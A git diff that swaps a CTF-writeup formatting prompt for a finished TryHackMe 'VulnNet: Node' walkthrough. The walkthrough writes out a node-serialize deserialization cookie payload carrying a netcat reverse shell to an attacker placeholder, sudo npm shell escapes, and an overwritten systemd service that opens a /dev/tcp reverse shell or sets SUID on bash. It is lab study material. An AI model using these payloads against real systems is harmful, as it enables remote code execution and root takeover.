@@ -1,215 +1,287 @@
-# lab-notes — CTF Writeup Prompt for renekerr/lab-notes
-
-## Purpose
-
-Convert raw CTF walkthrough notes into a clean, structured Markdown document for `github.com/renekerr/lab-notes`. Documents are technical references, not blog posts — no Jekyll front matter, no narrative tone. English only.
-
----
-
-## Repository Structure
-
-```
-lab-notes/
-├── easy/
-│   └── vulnnet-internal.md
-├── medium/
-│   └── room-name.md
-├── hard/
-│   └── room-name.md
-└── README.md
-```
-
-**Naming convention:** `room-name.md` (lowercase, hyphenated, no date prefix)
-**Placement:** file goes in the folder matching the room difficulty
-
----
-
-## Input Requirements
-
-Provide:
-1. **Raw walkthrough notes** (Markdown or plain text)
-2. **Room URL**
-3. **Platform** (TryHackMe, Hack The Box, PortSwigger, etc.)
-4. **Difficulty** (Easy, Medium, Hard)
-
----
-
-## Output Format & Structure
-
-### 1. Title and Metadata Table
-
-```markdown
-# [Room Name]
+# VulnNet: Node
 
 | | |
 |---|---|
-| **Platform** | [TryHackMe / Hack The Box / PortSwigger / other] |
-| **Difficulty** | [Easy / Medium / Hard] |
-| **URL** | [full URL] |
-| **Focus** | [one-line description of the main technique or chain] |
-```
-
-No front matter. No date. No tags section. Starts directly with the title.
+| **Platform** | TryHackMe |
+| **Difficulty** | Easy |
+| **URL** | https://tryhackme.com/room/vulnnetnode |
+| **Focus** | Node.js deserialization RCE (CVE-2017-5941) → sudo npm → writable systemd service |
 
 ---
 
-### 2. Steps
+## Port Scan `[RECON]`
 
-One section per exploitation phase, in order. Each section:
+rustscan is a fast port scanner that passes open ports to nmap for service detection.
 
-```markdown
-## [Descriptive Step Name] `[PHASE]`
-```
-
-Phases (always in English, always in brackets):
-`[RECON]` `[ENUMERATION]` `[EXPLOITATION]` `[PRIVESC]` `[POST-EXPLOITATION]`
-
-Each step contains:
-- A one-line intro describing what the service/tool is and what it is used for in this specific context
-- The relevant command(s) with output in the same code block
-- A switch table if the command has non-obvious flags
-- One or two lines summarizing the finding
-- An optional `> **Note:**` for non-obvious context
-
-**Code block format:**
 ```bash
-command here
+rustscan -a <TARGET_IP> -- -sC -sV
 
-relevant output
-output line 2
-[...] if longer than 20 lines
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
+8080/tcp open  http    Node.js Express framework
 ```
 
-**Switch table format:**
+Two services exposed: SSH and a Node.js Express application on port 8080.
+
+---
+
+## Web Enumeration `[ENUMERATION]`
+
+feroxbuster performs recursive content discovery against the web application.
+
+```bash
+feroxbuster -u http://<TARGET_IP>:8080/ \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -x html,php,txt,js,json,bak \
+  --extract-links --scan-limit 2 --filter-status 401,403,404,405,500
+
+/login
+```
+
 | Switch | Description |
 |--------|-------------|
-| `-x` | What it does |
+| `-x` | File extensions to append to each wordlist entry |
+| `--extract-links` | Parse discovered pages for additional links to scan |
+| `--scan-limit` | Maximum number of concurrent scans |
+| `--filter-status` | HTTP status codes to exclude from results |
 
-**Rules:**
-- Replace all real IPs: `<TARGET_IP>` and `<ATTACKER_IP>`
-- Each piece of information appears only once, at the step where it is first used
-- No flags or flag values anywhere in the document
-- No whoami as a standalone verification step
-- No numbering on steps — descriptive name + phase tag only
-- Separator `---` between steps
+Only `/login` discovered as a notable endpoint.
 
 ---
 
-### 3. Attack Chain
+## Session Cookie Inspection `[ENUMERATION]`
 
-Mandatory section, placed after all steps.
+The application sets a session cookie on the first request. Extracting it with curl reveals its structure.
 
-```markdown
+```bash
+curl -I http://<TARGET_IP>:8080/ | grep "Set-Cookie"
+
+Set-Cookie: session=eyJ1c2VybmFtZSI6Ikd1ZXN0[...]; Max-Age=1200; Path=/; HttpOnly
+```
+
+URL-decoding `%3D%3D` → `==` and decoding from Base64:
+
+```bash
+echo "eyJ1c2VybmFtZSI6Ikd1ZXN0[...]" | base64 -d
+
+{"username":"Guest","isGuest":true,"encoding": "utf-8"}
+```
+
+The cookie contains a user-controlled JSON object. The server deserializes it without validation using the `node-serialize` package — RCE vector via CVE-2017-5941.
+
+---
+
+## Deserialization Payload Construction `[EXPLOITATION]`
+
+`node-serialize` uses `eval()` internally. Any value prefixed with `_$$ND_FUNC$$_` followed by a function with `()` at the end (IIFE) is executed automatically at deserialization time.
+
+Payload with a reverse shell via named pipe, encoded to Base64:
+
+```bash
+echo -n '{"username":"_$$ND_FUNC$$_function(){require('"'"'child_process'"'"').exec('"'"'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 4545 >/tmp/f'"'"')}()","isGuest":true,"encoding":"utf-8"}' | base64 -w 0
+```
+
+| Switch | Description |
+|--------|-------------|
+| `-w 0` | Disables automatic line wrapping at 76 characters — required to keep the cookie value intact |
+
+---
+
+## Shell via Malicious Cookie `[EXPLOITATION]`
+
+Start listener on attacker:
+
+```bash
+nc -lvnp 4545
+```
+
+Send the cookie with the encoded payload:
+
+```bash
+curl -s http://<TARGET_IP>:8080/ -H "Cookie: session=<BASE64_PAYLOAD>"
+```
+
+Shell received as `www`. Stabilize:
+
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+export SHELL=bash
+# Ctrl+Z
+stty raw -echo; fg
+```
+
+```bash
+id
+
+uid=1001(www) gid=1001(www) groups=1001(www)
+```
+
+---
+
+## Lateral Movement to serv-manage via sudo npm `[PRIVESC]`
+
+Checking sudo permissions for the current user:
+
+```bash
+sudo -l
+
+(serv-manage) NOPASSWD: /usr/bin/npm
+```
+
+Create a working directory and exploit via `package.json` scripts:
+
+```bash
+mkdir /tmp/privesc && cd /tmp/privesc
+```
+
+**Option A — npm run:**
+
+```bash
+echo '{"scripts":{"shell":"bash"}}' > package.json
+sudo -u serv-manage npm run shell --unsafe-perm=true
+```
+
+**Option B — npm install with preinstall hook:**
+
+```bash
+echo '{"scripts":{"preinstall":"/bin/bash"}}' > package.json
+sudo -u serv-manage /usr/bin/npm install
+```
+
+```bash
+id
+
+uid=1000(serv-manage) gid=1000(serv-manage) groups=1000(serv-manage)
+```
+
+`npm` executes `scripts` entries as child processes with the privileges of the invoking user. Both options are documented in GTFOBins under the `sudo` category.
+
+---
+
+## Writable systemd Service Identification `[PRIVESC]`
+
+```bash
+sudo -l
+
+(root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
+(root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
+(root) NOPASSWD: /bin/systemctl daemon-reload
+```
+
+```bash
+ls -l /etc/systemd/system/vulnnet-job.service
+
+-rw-rw-r-- 1 root serv-manage 197 Jan 24 2021 /etc/systemd/system/vulnnet-job.service
+```
+
+```bash
+cat /etc/systemd/system/vulnnet-auto.timer
+
+[Timer]
+OnBootSec=0min
+OnCalendar=*:0/30
+Unit=vulnnet-job.service
+```
+
+The timer triggers `vulnnet-job.service` immediately at boot and every 30 minutes. The `.service` file is writable by `serv-manage` and runs as root.
+
+---
+
+## Privilege Escalation to root via Writable systemd Service `[PRIVESC]`
+
+**Option A — Reverse shell:**
+
+Start listener on attacker:
+
+```bash
+nc -lvnp 4646
+```
+
+Overwrite the service file:
+
+```bash
+cat > /etc/systemd/system/vulnnet-job.service << 'EOF'
+[Unit]
+Description=VulnNet Job
+
+[Service]
+Type=oneshot
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4646 0>&1'
+
+[Install]
+WantedBy=multi-user.target
+EOF
+```
+
+**Option B — SUID on /bin/bash:**
+
+```bash
+cat > /etc/systemd/system/vulnnet-job.service << 'EOF'
+[Unit]
+Description=VulnNet Job
+Wants=vulnnet-auto.timer
+
+[Service]
+Type=forking
+ExecStart=/bin/chmod u+s /bin/bash
+
+[Install]
+WantedBy=multi-user.target
+EOF
+```
+
+After SUID is applied:
+
+```bash
+/bin/bash -p
+```
+
+**Reload and activate the timer (both options):**
+
+```bash
+sudo /bin/systemctl stop vulnnet-auto.timer
+sudo /bin/systemctl daemon-reload
+sudo /bin/systemctl start vulnnet-auto.timer
+```
+
+```bash
+id
+
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+---
+
 ## Attack Chain
 
 ```mermaid
 graph TD
-    A["Step 1\ntool or method"] --> B["Step 2\nfinding or result"]
-    ...
+    A["Port scan\nrustscan port 8080"] --> B["Session cookie\nBase64 JSON object"]
+    B --> C["Insecure deserialization\nCVE-2017-5941 node-serialize"]
+    C --> D["Reverse shell\nas www"]
+    D --> E["sudo npm\nNOPASSWD serv-manage"]
+    E --> F["npm preinstall hook\nshell as serv-manage"]
+    F --> G["vulnnet-job.service writable\nsudo systemctl daemon-reload"]
+    G --> H["Option A: reverse shell\nas root"]
+    G --> I["Option B: SUID bash\nbash -p"]
 ```
-```
-
-**Rules:**
-- All node labels in double quotes
-- Use `\n` for line breaks inside nodes
-- No special characters inside nodes: no accents, no `→`, `_`, `?`, `>`, `@`, `#`, `{`, `}`, `(`, `)`
-- Replace underscores with spaces
-- Credentials with special characters: show only username and a generic reference
-- Each node: what was done + how (tool or method)
-- 8–15 nodes covering the full chain from recon to objective
 
 ---
 
-### 4. Key Concepts *(optional)*
-
-Include only when the room introduces a technique or service that benefits from a short explanation not already covered in the steps.
-
-```markdown
 ## Key Concepts
 
-**[Concept name]**
+**Insecure deserialization (CVE-2017-5941).** Serialization converts an in-memory object into a byte sequence for storage or transmission — deserialization does the reverse. The vulnerability arises when user-controlled data is deserialized without validation. The `node-serialize` package uses `eval()` internally to reconstruct functions: any value prefixed with `_$$ND_FUNC$$_` is evaluated as JavaScript. If the function includes `()` at the end (IIFE — Immediately Invoked Function Expression), it executes automatically at deserialization time, before the application processes the object.
 
-[2–4 sentences. What it is, how it works, why it matters in an offensive context.]
-```
+**sudo over npm.** `npm run` and `npm install` execute commands defined in the `scripts` field of `package.json` as child processes. If a user can invoke `npm` as another user via `sudo`, they control what commands that user runs — including a shell. Documented in GTFOBins under the `sudo` category.
 
-No bullet points. Short paragraphs only.
+**Writable systemd service abuse.** systemd is the modern Linux init and service manager (PID 1). `.timer` units are the systemd equivalent of cron — they trigger `.service` units on a schedule. If a `.service` file executed by a root-owned timer is writable by an unprivileged user, modifying its `ExecStart` field gives arbitrary code execution as root on the next cycle. The `stop` / `daemon-reload` / `start` sequence forces systemd to re-read the modified file before execution.
 
 ---
 
-### 5. Lessons Learned *(optional)*
-
-Non-obvious takeaways only. Maximum 5 items. Bullet list.
-
-```markdown
 ## Lessons Learned
 
-- [Specific, non-generic lesson derived from this room]
-```
+- Cookies containing serialized JSON objects are immediate candidates for insecure deserialization — always decode Base64 and inspect the content before looking for other vectors.
+- `sudo` over package managers (`npm`, `pip`, `gem`) is equivalent in practice to arbitrary code execution — treat them as `sudo bash`.
+- Writable systemd `.service` files are a direct escalation vector to root when `sudo` over `systemctl` is available. Always audit systemd unit file permissions during post-access enumeration.
 
-Exclude:
-- Generic advice ("always run nmap first")
-- Anything already covered in Key Concepts
-- Obvious conclusions that restate what the steps show
-
----
-
-## Content Rules
-
-- **Language:** English throughout
-- **Tone:** technical, impersonal, minimal — just enough to understand how to reproduce the result
-- **No narrative:** no first person, no "I tried", no process commentary
-- **No flags:** never include actual flag values — if a flag appears in a command output, replace it with `REDACTED`
-- **Cookies, tokens, and session values** captured from responses: truncate after the first 20 characters and append `[...]` — Example: `eyJ1c2VybmFtZSI6Ikd1ZXN0[...]`
-- **Passwords and hashes** captured from files or command output: replace with `<PASSWORD>` or `<HASH>` respectively
-- **No assumptions:** only document what appears in the notes
-- **No external searches:** unless explicitly authorized
-- **Spelling:** check before generating — no typos, no missing accents on technical terms that require them
-- **Each data point appears once:** at the step where it is first used
-
----
-
-## Validation Before Generating
-
-Check that the notes include the following. If anything is missing, ask only for what is missing:
-
-1. Platform and room URL
-2. Difficulty level
-3. Port scan output (nmap, rustscan, masscan) — clean format, no `|` sub-lines
-4. Key command outputs: enumeration tools, web responses, shell access, privilege escalation
-5. Exact file paths, wordlists, credentials used
-6. Exploit details if applicable: path, parameters, adaptations
-7. Escalation technique with verification commands
-8. Any hashes: exact value, type, wordlist, result
-
----
-
-## Final Checklist
-
-- [ ] No Jekyll front matter
-- [ ] Metadata table present (Platform, Difficulty, URL, Focus)
-- [ ] All IPs replaced with `<TARGET_IP>` / `<ATTACKER_IP>`
-- [ ] No flag values anywhere — flags visible in command output replaced with `REDACTED`
-- [ ] Cookies, tokens, session values truncated to 20 chars + `[...]`
-- [ ] Passwords and hashes replaced with `<PASSWORD>` / `<HASH>`
-- [ ] Command and output in the same code block
-- [ ] Switch tables for commands with non-obvious flags
-- [ ] Each data point appears only once
-- [ ] No whoami as standalone verification
-- [ ] No step numbering
-- [ ] Separators `---` between steps
-- [ ] Attack Chain section present with valid Mermaid syntax
-- [ ] No special characters or accents inside Mermaid nodes
-- [ ] Key Concepts included only when genuinely needed
-- [ ] Lessons Learned are non-obvious and non-generic
-- [ ] File named `room-name.md` and placed in the correct difficulty folder
-- [ ] Spelling checked
-
----
-
-## How to Use
-
-1. Paste this prompt + raw notes into Claude
-2. Specify: platform, room URL, difficulty
-3. Claude generates the `.md` file directly — no draft shown unless requested
-4. Place the file in `easy/`, `medium/`, or `hard/` accordingly
-5. Push to `github.com/renekerr/lab-notes`
